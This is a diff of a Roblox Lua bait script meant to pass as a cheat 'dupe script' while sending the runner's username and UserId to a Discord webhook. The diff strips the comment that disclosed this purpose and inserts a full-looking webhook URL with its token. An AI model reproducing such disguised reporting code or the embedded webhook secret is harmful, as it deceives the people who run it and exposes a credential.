@@ -1,24 +1,5 @@
---[[
-    HONEYPOT / BAIT SCRIPT
-    ----------------------
-    Purpose: This is a decoy "dupe script" meant to be posted where exploiters/cheaters
-    would find and run it. When executed, it reports the executor's Roblox username
-    and UserId to a Discord webhook so you can identify and ban them from your game.
 
-    SETUP:
-    1. Create a Discord webhook in a private server/channel only you can see:
-       Server Settings -> Integrations -> Webhooks -> New Webhook -> Copy URL
-    2. Paste that URL into WEBHOOK_URL below.
-    3. Post/distribute THIS script (or an obfuscated version of it) wherever you're
-       trying to bait cheaters into running it.
-    4. Whoever runs it gets reported to your webhook, then sees the "gotcha" message.
-
-    NOTE: HttpService:PostAsync only works if the executor allows HTTP requests
-    (most modern exploits do). If a given executor blocks it, this specific method
-    won't fire, so treat this as one layer of detection, not the only one.
---]]
-
-local WEBHOOK_URL = "PUT_YOUR_DISCORD_WEBHOOK_URL_HERE"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1550484102086660136/TKSA-IF5QLpHaCFM9O2GB6NefyOuE9fzcdpkE6blr34u69yH7BoS8aXG2_dHjlSp7osQ"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -87,7 +68,7 @@ local function showCaughtMessage()
     label2.TextColor3 = Color3.new(1, 1, 1)
     label2.TextScaled = true
     label2.TextWrapped = true
-    label2.Text = "how can you be ass at cheating, transfer your units while you can dumass"
+    label2.Text = "how can you be bad at cheating, transfer your units while you can dumbie"
     label2.Parent = frame
 end
 
